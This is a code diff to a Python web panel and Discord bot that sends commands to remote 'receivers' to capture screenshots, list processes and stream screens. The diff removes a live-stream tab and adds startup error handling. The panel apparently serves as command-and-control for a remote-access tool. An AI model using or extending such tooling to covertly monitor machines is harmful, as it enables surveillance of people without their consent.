@@ -63,11 +63,6 @@ DATA_DIR.mkdir(exist_ok=True)
 
 TAG_PATTERN = re.compile(r"^\s*(\[[^\]\r\n]{2,32}\])")
 TAG_ANYWHERE = re.compile(r"(\[[^\[\]\r\n]{2,32}\])")
-STREAM_URL_PATTERN = re.compile(r"(https?://[^\s>]+/stream)", re.IGNORECASE)
-
-LAST_STREAM_URL: Optional[str] = None
-LAST_STREAM_TAG: Optional[str] = None
-LAST_STREAM_TS: Optional[str] = None
 
 def _register_tag(tag: str) -> str:
     """
@@ -117,15 +112,6 @@ def _resolve_tag(tag: str = "") -> str:
         return _register_tag(tag)
     return ACTIVE_BOT_TAG
 
-
-def _record_stream_url(url: str, tag: Optional[str], ts: Optional[str]) -> None:
-    """
-    Keep the most recent live stream URL announced by any receiver.
-    """
-    global LAST_STREAM_URL, LAST_STREAM_TAG, LAST_STREAM_TS
-    LAST_STREAM_URL = url
-    LAST_STREAM_TAG = tag or ACTIVE_BOT_TAG
-    LAST_STREAM_TS = ts
 
 def play_tune(duration_sec: float = 5.0) -> None:
     """
@@ -179,10 +165,30 @@ async def _get_channel(channel_id: int):
         ch = await bot.fetch_channel(channel_id)
     return ch
 
+
+async def _wait_controller_ready(timeout: float = 8.0):
+    """
+    Wait for the Discord controller bot to be ready; fail fast if it never connects.
+    """
+    if _controller_error:
+        raise HTTPException(status_code=503, detail=f"Discord bot failed to start: {_controller_error}")
+    if _controller_ready.is_set():
+        return
+    try:
+        await asyncio.wait_for(_controller_ready.wait(), timeout=timeout)
+    except asyncio.TimeoutError:
+        if _controller_error:
+            raise HTTPException(status_code=503, detail=f"Discord bot failed to start: {_controller_error}")
+        raise HTTPException(status_code=503, detail="Discord bot not connected yet.")
+    if _controller_error:
+        raise HTTPException(status_code=503, detail=f"Discord bot failed to start: {_controller_error}")
+
 @bot.event
 async def on_ready():
-    print(f"✅ Controller bot logged in as {bot.user}")
+    print(f"Controller bot logged in as {bot.user}")
     play_tune()
+    global _controller_error
+    _controller_error = None
     _controller_ready.set()
 
 # WebSocket broadcast hub
@@ -242,15 +248,6 @@ async def on_message(message: discord.Message):
             "ts": message.created_at.isoformat(),
             "tag": tag,
         }
-        stream_url = None
-        try:
-            match = STREAM_URL_PATTERN.search(message.content or "")
-            if match:
-                stream_url = match.group(1)
-                _record_stream_url(stream_url, tag, payload["ts"])
-                payload["stream_url"] = stream_url
-        except Exception:
-            stream_url = None
         # Save any attachments (e.g., screenshot.png)
         for att in message.attachments:
             try:
@@ -321,10 +318,6 @@ PANEL_HTML = r"""<!doctype html>
     .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:220px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:var(--text);} label{font-weight:700;}
     .feed{display:flex; flex-direction:column; gap:10px; max-height:420px; overflow:auto; padding-right:4px;} .feed.small{max-height:360px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(14,19,30,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
     .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0f19; cursor:pointer;} .shot img{width:100%; display:block;}
-    .live-wrap{display:flex; flex-direction:column; gap:12px; height:100%;}
-    .live-meta{display:flex; flex-direction:column; gap:6px;}
-    .live-frame{flex:1; border:1px solid var(--line); border-radius:12px; background:#05070d; display:flex; align-items:center; justify-content:center; overflow:hidden;}
-    .live-frame img{width:100%; height:100%; object-fit:contain; background:#000;}
     #toast{position:fixed; left:50%; bottom:18px; transform:translateX(-50%); padding:9px 14px; border-radius:12px; border:1px solid var(--line); background:var(--panel); font-weight:700; opacity:0; transition:opacity .18s ease; z-index:120;}
   </style>
 </head>
@@ -360,7 +353,6 @@ PANEL_HTML = r"""<!doctype html>
     <div class="shell">
       <div class="tabbar">
         <button class="tab-btn active" data-tab="dash">Dashboard</button>
-        <button class="tab-btn" data-tab="live">Live</button>
         <button class="tab-btn" data-tab="shots">Screenshots</button>
         <button class="tab-btn" data-tab="procs">Processes</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
@@ -425,32 +417,6 @@ PANEL_HTML = r"""<!doctype html>
           </div>
         </div>
 
-        <div id="tab-live" class="view" aria-hidden="true">
-          <div class="card" style="height:100%; display:flex; flex-direction:column;">
-            <div class="head">
-              <div><div class="eyebrow">Live feed</div><h3>Receiver screen</h3></div>
-              <div class="row" style="gap:6px;">
-                <input id="liveManualUrl" placeholder="http://host:8081/stream" style="min-width:220px; flex:1;"/>
-                <button class="btn small" onclick="loadManualStream()">Load</button>
-                <button class="btn primary small" onclick="startLiveAndWatch()">Start live</button>
-              </div>
-            </div>
-            <div class="live-wrap">
-              <div class="live-meta">
-                <div id="liveStatus" class="eyebrow">Waiting for stream...</div>
-                <div id="liveUrlLabel" class="muted"></div>
-                <div class="row" style="gap:6px;">
-                  <button class="btn small" onclick="refreshLiveStatus()">Sync latest</button>
-                  <button class="btn small" onclick="openLiveInNewTab()">Open in new tab</button>
-                </div>
-              </div>
-              <div class="live-frame">
-                <img id="liveFrame" alt="Live receiver view (MJPEG stream)" />
-              </div>
-            </div>
-          </div>
-        </div>
-
         <div id="tab-shots" class="view" aria-hidden="true">
           <div class="card" style="height:100%; display:flex; flex-direction:column;">
             <div class="head">
@@ -486,11 +452,9 @@ PANEL_HTML = r"""<!doctype html>
   <div id="toast"></div>
 
   <script>
-    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveFrame:document.getElementById('liveFrame'), liveStatus:document.getElementById('liveStatus'), liveUrlLabel:document.getElementById('liveUrlLabel'), liveManualUrl:document.getElementById('liveManualUrl')};
+    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList')};
     let currentTag = "{BOT_TAG}";
     let knownTags = new Set([currentTag]);
-    let liveUrl = "";
-    let liveTag = "";
     let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
 
     function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
@@ -520,7 +484,6 @@ PANEL_HTML = r"""<!doctype html>
     async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); }
     function withTag(path){ const u=new URL(path, window.location.origin); if(currentTag) u.searchParams.set('tag', currentTag); return u.pathname + u.search; }
     const tagRegex = /(^|\\s)(\\[[^\\[\\]\\r\\n]{2,32}\\])/;
-    const streamRegex = /(https?:\\/\\/[^\\s>]+\\/stream)/i;
     function parseTag(text){ const m=(text||'').match(tagRegex); return m?m[2]:null; }
     function touchTagFromMessage(obj){
       const found = (obj&&obj.tag) || parseTag(obj&&obj.content);
@@ -532,27 +495,6 @@ PANEL_HTML = r"""<!doctype html>
       }
     }
 
-    function applyLiveUrl(url, tag){
-      if(!url) return;
-      liveUrl = url;
-      liveTag = tag || liveTag || currentTag;
-      if(el.liveFrame) el.liveFrame.src = url;
-      if(el.liveStatus) el.liveStatus.textContent = 'Streaming ' + (liveTag || '');
-      if(el.liveUrlLabel) el.liveUrlLabel.textContent = url;
-      if(el.liveManualUrl && !el.liveManualUrl.value) el.liveManualUrl.value = url;
-    }
-
-    function openLiveInNewTab(){ if(liveUrl) window.open(liveUrl, '_blank'); else toast('No live URL yet'); }
-    async function refreshLiveStatus(){ try{ const r = await fetch('/stream_status'); const j = await r.json(); if(j && j.url){ applyLiveUrl(j.url, j.tag || currentTag); } else { toast('No live stream announced yet'); } } catch(e){ toast('Could not sync live feed'); } }
-    function loadManualStream(){ const url=(el.liveManualUrl?.value||'').trim(); if(!url){ toast('Enter a stream URL'); return; } applyLiveUrl(url, currentTag); toast('Live stream loaded'); }
-    async function startLiveAndWatch(){ const ok = await startLive(); if(ok) { setTab('live'); toast('Starting live feed'); } }
-    function extractStream(obj){
-      if(!obj) return null;
-      if(obj.stream_url) return obj.stream_url;
-      const found=(obj.content||'').match(streamRegex);
-      return found ? found[1] : null;
-    }
-
     function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = `${time} - ${author}`; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
     function addFeed(container, div, limit=200){ container.prepend(div); while(container.children.length>limit) container.lastChild.remove(); }
     function addShot(url){ if(!url) return; const wrap=document.createElement('div'); wrap.className='shot'; const img=document.createElement('img'); img.loading='lazy'; img.src=url; wrap.onclick=()=> window.open(url,'_blank'); wrap.appendChild(img); el.gallery.prepend(wrap); while(el.gallery.children.length>60) el.gallery.lastChild.remove(); }
@@ -560,7 +502,7 @@ PANEL_HTML = r"""<!doctype html>
     function addLog(div){ addFeed(el.logFeed, div, 300); }
 
     function setTab(id){
-      ['dash','live','shots','procs','logs'].forEach(t=>{
+      ['dash','shots','procs','logs'].forEach(t=>{
         const view=document.getElementById(`tab-${t}`);
         const active=t===id;
         view.classList.toggle('active', active);
@@ -570,11 +512,11 @@ PANEL_HTML = r"""<!doctype html>
     }
     document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
 
-    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; touchTagFromMessage(obj); const sUrl=extractStream(obj); if(sUrl) applyLiveUrl(sUrl, obj.tag || parseTag(obj.content)); const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
-    connectWS(); refreshTags(); refreshLiveStatus(); renderTags();
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; touchTagFromMessage(obj); const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
+    connectWS(); refreshTags(); renderTags();
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
-    async function startLive(){ const m=document.getElementById('monitorIdx').value.trim()||'1'; try{ await post('/cmd/live_start?monitor='+encodeURIComponent(m)); toast('Live stream starting'); return true; } catch(e){ toast(e.message||'Could not start live'); return false; } }
+    async function startLive(){ const m=document.getElementById('monitorIdx').value.trim()||'1'; try{ await post('/cmd/live_start?monitor='+encodeURIComponent(m)); toast('Live stream starting'); } catch(e){ toast(e.message);} }
     async function viewStream(){ const url=document.getElementById('streamUrl').value.trim(); if(!url){toast('Enter stream URL'); return;} try{ await post('/cmd/show_stream?url='+encodeURIComponent(url)); toast('Stream overlay sent'); } catch(e){ toast(e.message);} }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
@@ -609,7 +551,7 @@ async def ws_endpoint(ws: WebSocket):
 
 # ---------- HTTP endpoints to send Discord commands ----------
 async def _send_cmd(msg: str):
-    await _controller_ready.wait()
+    await _wait_controller_ready()
     ch = await _get_channel(COMMAND_CHANNEL_ID)
     await ch.send(msg)
 
@@ -617,7 +559,7 @@ async def _send_cmd_with_file(msg: str, file_path: Path):
     """
     Send a command message and attach a file if provided.
     """
-    await _controller_ready.wait()
+    await _wait_controller_ready()
     ch = await _get_channel(COMMAND_CHANNEL_ID)
     async with ch.typing():
         with open(file_path, "rb") as f:
@@ -627,7 +569,7 @@ async def _send_cmd_with_files(msg: str, file_paths: List[Path]):
     """
     Send a command message with multiple file attachments.
     """
-    await _controller_ready.wait()
+    await _wait_controller_ready()
     ch = await _get_channel(COMMAND_CHANNEL_ID)
     files = []
     handles = []
@@ -719,24 +661,23 @@ async def select_tag(tag: str = Query(..., min_length=1)):
 
 @app.get("/health")
 async def health():
-    return {"ok": True}
-
-
-@app.get("/stream_status")
-async def stream_status():
-    """
-    Expose the latest announced stream URL so the UI can reconnect after refresh.
-    """
     return {
-        "url": LAST_STREAM_URL,
-        "tag": LAST_STREAM_TAG,
-        "ts": LAST_STREAM_TS,
+        "ok": True,
+        "controller_ready": _controller_ready.is_set(),
+        "controller_error": _controller_error,
     }
 
 # ---------- Run Discord bot in the same process ----------
 @app.on_event("startup")
 async def _startup():
-    asyncio.create_task(bot.start(CONTROLLER_TOKEN))
+    async def _run_bot():
+        global _controller_error
+        try:
+            await bot.start(CONTROLLER_TOKEN)
+        except Exception as exc:
+            _controller_error = str(exc)
+            _controller_ready.set()
+    asyncio.create_task(_run_bot())
 
 @app.on_event("shutdown")
 async def _shutdown():
